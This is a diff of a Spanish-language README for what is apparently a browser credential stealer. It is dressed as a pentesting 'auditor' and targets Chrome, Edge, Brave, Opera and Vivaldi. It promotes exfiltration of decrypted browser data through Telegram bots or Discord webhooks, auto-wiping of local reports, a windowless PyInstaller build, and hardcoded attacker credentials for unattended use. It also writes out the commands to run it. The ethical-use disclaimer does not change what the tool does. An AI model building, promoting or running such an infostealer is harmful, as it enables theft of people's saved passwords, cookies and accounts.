@@ -29,22 +29,22 @@
 
 La suite escanea y descifra automáticamente los siguientes objetivos:
 
-*   🌐 **Google Chrome** (Canary, Beta, Stable)
-*   🌐 **Microsoft Edge**
-*   🦁 **Brave Browser**
-*   ⭕ **Opera & Opera GX**
-*   📐 **Vivaldi**
+* 🌐 **Google Chrome** (Canary, Beta, Stable)
+* 🌐 **Microsoft Edge**
+* 🦁 **Brave Browser**
+* ⭕ **Opera & Opera GX**
+* 📐 **Vivaldi**
 
 ---
 
 ## 🚀 Características Premium
 
-*   **📡 Exfiltración Modular**: 
-    *   Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
-*   **📊 Reportes Dinámicos**: 
-    *   Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
-*   **🕵️ Arquitectura de Sigilo (Stealth)**: 
-    *   Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
+* **📡 Exfiltración Modular**:
+  * Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
+* **📊 Reportes Dinámicos**:
+  * Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
+* **🕵️ Arquitectura de Sigilo (Stealth)**:
+  * Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
 
 ---
 
@@ -63,6 +63,7 @@ La suite escanea y descifra automáticamente los siguientes objetivos:
 ## ⚙️ Guía de Uso Rápido
 
 ### 1. Instalación de Dependencias
+
 ```bash
 pip install -r requirements.txt
 ```
@@ -70,14 +71,19 @@ pip install -r requirements.txt
 ### 2. Comandos Magistrales
 
 > **Generar Reporte HTML Estético:**
+
 ```bash
 python main.py -f html -o reporte_final
 ```
 
 > **Exfiltración Remota vía Telegram:**
+
 ```bash
-python main.py --telegram-token "TU_TOKEN" --telegram-chatid "TU_ID"
+python main.py -t "TU_TOKEN" -c "TU_ID"
 ```
+
+> [!TIP]
+> **Uso Autónomo**: Puedes dejar estos campos vacíos si has rellenado las `CREDENCIALES HARDCODED` directamente en el código de `main.py`.
 
 ---
 
@@ -96,9 +102,9 @@ pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
 | :--- | :--- | :--- |
 | 📄 | `-f`, `--format` | Formatos: `html` (interactivo) o `csv`. |
 | 📁 | `-o`, `--output` | Nombre base del archivo de salida. |
-| 🤖 | `--telegram-token` | Token del bot (API Telegram). |
-| 🆔 | `--telegram-chatid` | ID de chat (API Telegram). |
-| 🔗 | `--discord` | URL del Webhook de Discord. |
+| 🤖 | `-t`, `--telegram-token` | Token del bot (API Telegram). |
+| 🆔 | `-c`, `--telegram-chatid` | ID de chat (API Telegram). |
+| 🔗 | `-d`, `--discord` | URL del Webhook de Discord. |
 | 🧹 | `--no-wipe` | Desactiva el auto-borrado post-exfiltración. |
 | 🛠️ | `-v`, `--verbose` | Logs detallados en consola. |
 
@@ -107,7 +113,7 @@ pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
 ## ⚖️ Aviso Legal y Ético
 
 > [!CAUTION]
-> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.** 
+> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
 > El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.
 
 ---
